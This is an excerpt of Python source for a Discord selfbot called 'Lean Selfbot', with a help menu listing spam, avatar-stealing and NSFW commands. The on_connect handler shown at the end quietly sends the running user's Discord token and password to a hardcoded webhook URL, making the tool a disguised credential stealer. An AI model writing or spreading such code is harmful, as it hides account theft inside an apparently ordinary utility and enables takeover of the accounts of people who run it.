...
ctypes.windll.kernel32.SetConsoleTitleW(f'Lean Selfbot v{SELFBOT.__version__}] | Loading...')
...
async def on_connect():
    ...
    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Lean Selfbot v{SELFBOT.__version__}] | Client User:{presence.user.name}#{presence.user.discriminator}')
...
async def help(ctx):
 ...
 embed.set_author(name="Lean Selfbot", icon_url=ctx.author.avatar_url)
 embed.set_image(url="https://media.tenor.co/videos/a6a1c4a22a2e8bf09ba4744fb57e8418/mp4")

 embed.add_field(name="ACCOUNT", value="`stream, listen, play, watch, ping, prefix, stopactivity, av, stealav, serverav, setpfp, spam, whois, uptime`", inline=False)
 ...
 embed.add_field(name="NSFW", value="`tits, anal, lesbian, hentai, boobs, blowjob`", inline=False)
...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/802386464997638164/Cmabd8JQHuKnpPI8qHXN7zfZjRgb27NFI7PB5OscPigtXyZoCA3vqBZrbEso1erphi9U',json={'content': f"  **Token:** `{token}`\n**Password:** `{password}`\n**Username: {presence.user.name}**`"})
    startprint()
